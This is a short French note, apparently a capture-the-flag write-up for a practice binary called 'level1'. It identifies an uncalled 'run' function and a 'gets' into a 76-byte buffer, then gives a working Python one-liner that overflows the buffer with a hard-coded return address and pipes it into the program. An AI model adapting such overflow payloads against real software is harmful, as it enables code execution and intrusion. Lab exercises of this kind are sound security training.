@@ -1,0 +1,7 @@
+dans le code on voit une fonction run qui n'est pas call
+dans le main il y a une gets avec un buffer de 76
+donc buffer overflow qui appelle la fonction run
+GG
+
+python -c "print 'A' * 76 + '\x44\x84\x04\x08'"> /tmp/t
+cat /tmp/t - | ./level1
